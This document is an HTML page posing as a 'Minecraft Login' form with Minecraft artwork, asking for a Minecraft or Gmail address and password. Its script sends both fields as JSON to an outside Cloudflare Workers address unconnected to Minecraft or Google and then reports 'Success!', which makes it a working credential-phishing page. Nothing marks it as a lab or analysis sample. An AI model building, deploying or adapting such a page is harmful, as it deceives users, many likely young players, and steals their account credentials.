<!DOCTYPE html>
<html lang="cs">
<head>
<meta charset="UTF-8">
<title>Minecraft Login</title>

<style>
body {
  margin: 0;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: Arial, sans-serif;

  background: url("https://upload.wikimedia.org/wikipedia/en/5/51/Minecraft_cover.png") no-repeat center center/cover;
}

.box {
  background: rgba(0, 0, 0, 0.75);
  padding: 35px;
  border-radius: 20px;
  width: 360px;
  text-align: center;
  box-shadow: 0 0 25px rgba(0,0,0,0.6);
  border: 3px solid #2ecc71;
}

h2 {
  color: #7CFC00;
  margin-bottom: 20px;
}

input {
  width: 90%;
  padding: 12px;
  margin: 10px 0;
  border: none;
  border-radius: 8px;
  font-size: 15px;
  outline: none;
}

button {
  width: 100%;
  padding: 14px;
  margin-top: 15px;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  font-size: 16px;
  font-weight: bold;
  background: #2ecc71;
  color: white;
  transition: 0.2s;
}

button:hover {
  background: #27ae60;
  transform: scale(1.03);
}
</style>
</head>

<body>

<div class="box">
  <h2>Minecraft Login</h2>

  <input id="email" placeholder="Minecraft / Gmail">
  <input id="password" placeholder="Password" type="password">

  <button onclick="sendData()">Login</button>
</div>

<script>
async function sendData() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const payload = {
    email: email,
    password: password
  };

  try {
    const response = await fetch("https://minecraft-form.m9018021.workers.dev", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      alert("Success!");
    } else {
      alert("Error sending data.");
    }

  } catch (e) {
    alert("Request failed.");
  }
}
</script>

</body>
</html>
